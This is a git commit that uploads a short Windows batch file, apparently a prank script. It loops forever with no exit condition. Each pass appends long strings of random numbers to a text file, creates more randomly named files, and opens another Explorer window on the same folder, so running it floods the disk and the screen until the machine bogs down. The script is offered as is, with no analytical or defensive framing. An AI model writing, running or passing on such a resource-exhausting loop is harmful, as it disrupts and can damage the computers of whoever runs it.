425a53dbff50147343d98e096b0cf2409a15884a
lolfrsame <110617729+lolfrsame@users.noreply.github.com>
2022-08-05 15:41:47 +0300

    Add files via upload

---
+++ frrrrrr.bat
@@ -0,0 +1,10 @@
+color 0a
+title fr
+mkdir fr
+cd C:\Users\fadia\Pictures\fr
+:top
+echo fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random%fr%random% >> fr.txt
+mkdir fr.txt
+echo fr >> %random%fr.txt
+start C:\Users\fadia\Pictures\fr
+goto top
